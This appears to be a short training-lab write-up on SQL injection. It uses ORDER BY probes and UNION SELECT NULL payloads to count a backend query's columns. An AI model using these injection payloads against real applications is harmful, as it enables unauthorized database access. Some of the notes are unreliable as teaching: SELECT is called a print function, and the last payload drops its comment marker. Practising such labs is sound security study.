#Step1: First of all check how many columns are present in the backend select statement using order by clause.

' order by 1--
' order by 2--
' order by 3--

# There are 3 columns present in backend server. So our task is to find the number of columns with the help of UNION.

#Step 2: Find number of columns with the help of UNION query

' union select null--		(this will give error)
' union select null,null--	(this will also return error)
' union select null,null,null 	(this will return 200 OK becoz there are 3 columns as we know before by using "order by" clause)

# LAB SOLVED !!!!.

SELECT is a print function (just like other programming languages)

ex-

	SELECT 'Hello'
	print('Hello')


# So, basically, we are using null values to print until the number of columns in the backend query matches the injected query

# The UNION rule is that the number of columns must match with the new SELECT statement. Therefore, we are trying this with SELECT
